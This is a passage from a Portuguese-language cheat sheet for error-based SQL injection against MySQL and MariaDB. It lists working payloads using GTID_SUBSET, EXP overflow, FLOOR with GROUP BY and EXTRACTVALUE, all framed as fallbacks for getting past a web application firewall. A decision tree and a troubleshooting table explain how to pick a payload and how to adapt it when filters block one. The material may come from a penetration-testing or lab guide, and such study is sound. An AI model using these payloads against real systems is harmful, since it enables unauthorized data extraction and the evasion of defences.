# echo -n 'password' | xxd -p  →  70617373776f7264  →  0x70617373776f7264


# ── FALLBACKS DE FUNÇÃO (bypass de WAF) ──────────────────────────────────────

# GTID_SUBSET (MySQL >= 5.6, MariaDB >= 10.0)
iron' AND GTID_SUBSET((SELECT database()), 1) -- -

# EXP overflow (MySQL 5.5–5.7, MariaDB — testar)
iron' AND EXP(~(SELECT * FROM (SELECT database())x)) -- -

# FLOOR + GROUP BY (MySQL 5.0–5.6, legado)
iron' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -

# Caracteres alternativos ao ~ se 0x7e for filtrado
# 0x21 → !   0x23 → #   0x40 → @
iron' AND EXTRACTVALUE(1, CONCAT(0x21, (SELECT database()))) -- -
```

---

### Mapa de decisão: qual função usar?

```
Tem EXTRACTVALUE/UPDATEXML?
├── SIM → Use EXTRACTVALUE (mais simples, padrão)
│         Se WAF bloquear EXTRACTVALUE → tente UPDATEXML
│         Se WAF bloquear ambos → vá para GTID_SUBSET ou EXP
└── NÃO (MySQL muito antigo ou função removida)
          └── Use FLOOR + GROUP BY (legado, instável em 8.0+)
```

---

### Diagnóstico rápido de problemas

| Sintoma | Causa provável | Solução |
|---------|----------------|---------|
| Erro `XPATH syntax error: '~'` mas sem dado | Subquery retornou NULL | Verifique o WHERE e o nome da tabela/coluna |
| `Subquery returns more than 1 row` | Faltou LIMIT ou GROUP_CONCAT | Adicione `LIMIT 0,1` ou envolva em `GROUP_CONCAT` |
| Dado truncado no erro | Limite de ~32 bytes do XPath | Use SUBSTRING para paginar (Seção 7) |
| 403 ou bloqueio ao usar EXTRACTVALUE | WAF com regra por nome | Troque por UPDATEXML, GTID_SUBSET ou EXP |
| Erro genérico, sem XPATH no texto | EXTRACTVALUE não executou | Revise o contexto de injeção e o `-- -` |
| `~POC` não aparece no erro | Error-based não viável aqui | Troque para UNION-based ou blind |

---

**A lógica é sempre a mesma: force a função a falhar com o seu dado como argumento. O erro é o canal. O dado fica preso no erro. Você lê o erro.**
